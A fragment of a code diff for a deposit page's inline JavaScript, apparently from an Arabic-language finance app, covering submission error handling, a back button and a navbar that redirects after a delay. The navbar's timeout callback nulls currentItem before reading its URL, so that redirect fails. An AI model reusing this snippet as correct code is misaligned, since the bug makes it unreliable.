+        showCustomToast("تم إرسال طلب الإيداع بنجاح", "success");
+        setTimeout(()=> window.location.href = "transactions.html", 2000);
+    } catch(err){
+        console.error(err);
+        showCustomToast("حدث خطأ: " + err.message, "error");
+        submitBtn.disabled = false;
+        submitBtn.innerText = "تقديم طلب الإيداع";
+        loader.style.display = "none";
     }
-    submitBtn.disabled = false;
-    submitBtn.innerText = "تقديم طلب الإيداع";
-    loader.style.display = "none";
-  }
 }
 
-function goBack(){
-  if (document.referrer) history.back();
-  else location.href = "dashboard.html";
-}
+function goBack(){ history.back(); }
+
+// ========== Navbar ==========
+const navItems = document.querySelectorAll('.nav-item');
+const currentPath = location.pathname.split('/').pop() || 'deposit.html';
+navItems.forEach(i => i.classList.remove('current-page'));
+navItems.forEach(i => { if(i.dataset.url === currentPath) i.classList.add('current-page'); });
+let timer = null, currentItem = null;
+navItems.forEach(item => {
+    item.addEventListener('click', function(){
+        if(this.classList.contains('current-page')) return;
+        if(timer){
+            clearTimeout(timer); timer = null;
+            if(currentItem){
+                const c = currentItem.querySelector('.nav-circle');
+                c.textContent = currentItem.dataset.egypt;
+                currentItem.classList.remove('showing');
+            }
+        }
+        const circle = this.querySelector('.nav-circle');
+        circle.textContent = this.dataset.alt;
+        this.classList.add('showing');
+        currentItem = this;
+        timer = setTimeout(()=>{
+            const c = currentItem.querySelector('.nav-circle');
+            c.textContent = currentItem.dataset.egypt;
+            currentItem.classList.remove('showing');
+            timer = null; currentItem = null;
+            window.location.href = currentItem.dataset.url;
+        }, 3000);
+    });
+});
 </script>
 </body>
-</html>
+    </html>
